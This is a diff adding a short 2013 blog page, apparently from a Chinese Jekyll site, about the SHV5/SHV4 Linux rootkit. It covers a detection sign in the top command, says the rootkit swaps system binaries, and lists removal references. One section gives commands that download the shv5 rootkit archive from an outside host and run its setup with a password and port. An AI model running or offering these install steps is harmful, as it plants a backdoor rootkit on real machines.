@@ -1,0 +1,152 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <title>SHV5/SHV4 rootkit &larr; </title>
+   <meta name="author" content="litsand" />
+
+   <link rel="start" href="/" />
+
+	
+	
+	
+  	<link rel="alternate" type="application/atom+xml" href="http://feeds.feedburner.com/feedname" title="RSS feed" />
+	
+	
+
+   <!-- syntax highlighting CSS -->
+   <link rel="stylesheet" href="/assets/themes/mark-reid/css/syntax.css" type="text/css" />
+
+   <!-- Homepage CSS -->
+   <link rel="stylesheet" href="/assets/themes/mark-reid/css/screen.css" type="text/css" />
+
+</head>
+<body id="">
+<div id="site">
+  
+  <div id="header">
+    <h1>
+    	<a href="/" title="normal world">normal world</a>
+    	<span class="byline">&larr; <a href="/">litsand</a></span>
+    </h1>
+    <ul class="nav">
+      <li><a class="home" href="/">Home</a></li>
+      <li><a  href="/archive.html">Archive</a></li>
+      <li><a  href="/pages.html">Pages</a></li>
+      <li><a  href="/categories.html">Categories</a></li>
+      <li><a  href="/tags.html">Tags</a></li>
+    </ul>
+  </div>
+
+  
+<div id="page">
+	
+  <h1 class="emphnext">SHV5/SHV4 rootkit</h1>
+  <ul class="tag_box inline">
+  
+  
+
+
+  
+     
+    	<li><a href="/tags.html#rootkit-ref">rootkit <span>5</span></a></li>
+    
+  
+
+
+
+  </ul>
+
+  <h2 id='id396'>发现痕迹</h2>
+
+<p>On RHEL or Centos 4 or 5, If you run the linux command top and you see something like:</p>
+
+<p>&#8220;Unknown HZ value! (75) Assume 100&#8221;</p>
+
+<p>Yours might not say &#8220;75&#8221; &#8211; it could be any number. If you see this, you should run rkhunter immediately, because your box has probably been taken over by a rootkit &#8211; either SHV4 or SHV5.</p>
+
+<p>The only reason you see this clue &#8220;Unknown HZ value&#8221; is because the rootkit replaces the top command (among others) with a substitute top command that will hide its processes. Their replacement top is old (version 1.2) and cannot handle the HZ value of the 2.6 linux kernel. Sad to say, but if this happens to you, its time to reinstall your OS!</p>
+
+<p>!!测试发现第一次安装shv5的时候,ls不会有出错信息,用脚本将rootkit清理一遍,当然不彻底,虽然rootkit失效了,但是有些残留.再次安装ls就会出现错误提示了.</p>
+
+<h2 id='shv5'>shv5安装</h2>
+
+<pre><code>wget http://baributz.hourb.com/localroot/shv5.tar.gz
+tar zxvf shv5.tar.gz
+cd shv5
+./setup pass port</code></pre>
+
+<h2 id='id397'>参考资料</h2>
+
+<p>http://www.kentoyer.com/2009/12/21/removing-the-shv5-rootkit/</p>
+
+<p>http://www.jigsawboys.com/2008/06/01/lead-story-test/</p>
+
+<p>http://serverfault.com/questions/524723/how-can-i-remove-shv4-shv5-rootkits</p>
+
+<p>http://blog.hostonnet.com/shv5-rootkit</p>
+
+<p>http://www.huweb.hu/maques/mblog/?p=153</p>
+
+<p>http://blog.wgzhao.com/2009/09/14/shv4-rootkit/</p>
+
+<p>http://blog.evilcoder.net/remove-linux-shv5-rootkit/</p>
+
+<p>http://web.fhnw.ch/plattformen/ns/vorlesungsunterlagen-1/network-analysis-tools/shv4-analysis</p>
+
+<p>http://blog.csdn.net/cnbird2008/article/details/4553488</p>
+
+  <address class="signature">
+    <a class="author" href="/">litsand</a> 
+    <span class="date">03 September 2013</span>
+    <span class="location"></span>
+  </address>
+  
+  <div class="prev-next">
+  
+    <a href="/工具使用/2013/09/03/syslog-watch-" class="next" title="syslog watch 测试">Next Post &rarr;</a>
+  
+  
+    <a href="/代码人生/2013/09/03/shellif" class="prev" title="shell脚本if语句学习">&larr; Earlier Post</a>
+  
+  </div>
+  
+</div><!-- End Page -->
+
+
+
+
+  
+  <div id="footer">
+  	<address>
+  		<span class="copyright">
+  			Content by <a href="/info/site.html">litsand</a>. Design by 
+  			<a href="http://mark.reid.name/">Mark Reid</a>
+  			<br/>
+  			(<a rel="licence" href="http://creativecommons.org/licenses/by-nc-sa/3.0/">Some rights reserved</a>)			
+  		</span>
+  		<span class="engine">
+  			Powered by <a href="http://github.com/mojombo/jekyll/" title="A static, minimalist CMS">Jekyll</a>
+  		</span>
+  	</address>
+  </div>
+  
+</div>
+
+<!--[if IE 6]>
+<script type="text/javascript"> 
+	/*Load jQuery if not already loaded*/ if(typeof jQuery == 'undefined'){ document.write("<script type=\"text/javascript\"   src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js\"></"+"script>"); var __noconflict = true; } 
+	var IE6UPDATE_OPTIONS = {
+		icons_path: "http://static.ie6update.com/hosted/ie6update/images/"
+	}
+</script>
+<script type="text/javascript" src="http://static.ie6update.com/hosted/ie6update/ie6update.js"></script>
+<![endif]-->
+
+  
+</body>
+</html>
+
